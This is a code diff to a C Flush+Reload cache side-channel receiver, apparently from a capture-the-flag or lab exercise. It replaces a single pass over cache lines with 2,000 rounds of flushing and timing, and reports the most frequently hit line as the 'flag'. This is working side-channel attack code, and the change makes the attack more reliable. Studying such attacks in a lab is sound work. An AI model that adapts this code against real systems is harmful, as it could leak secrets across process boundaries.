@@ -8,6 +8,7 @@
 #include <unistd.h>
 
 #define THRESHOLD 150
+#define ROUNDS 2000
 
 // waits n cycles
 static void wait(int n)
@@ -37,17 +38,30 @@ int main()
         order[j] = t;
     }
 
-    // flush and reload one line at a time
-    for (int k = 0; k < SEC_RANGE; k++)
+    // count hits per line over many rounds
+    int hits[SEC_RANGE] = {0};
+    for (int r = 0; r < ROUNDS; r++)
     {
-        int i = order[k];
-        ADDR_PTR addr = (ADDR_PTR)(buf + i * ALIGN);
-        clflush(addr);
-        wait(800);
-        CYCLES t = measure_one_block_access_time(addr);
-        if (t < THRESHOLD)
-            flag = i;
+        for (int k = 0; k < SEC_RANGE; k++)
+        {
+            int i = order[k];
+            ADDR_PTR addr = (ADDR_PTR)(buf + i * ALIGN);
+            clflush(addr);
+            wait(800);
+            CYCLES t = measure_one_block_access_time(addr);
+            if (t < THRESHOLD)
+                hits[i]++;
+        }
     }
+
+    // flag is the line hit most often
+    int best = 0;
+    for (int i = 0; i < SEC_RANGE; i++)
+        if (hits[i] > best)
+        {
+            best = hits[i];
+            flag = i;
+        }
 
     printf("Flag: %d\n", flag);
 
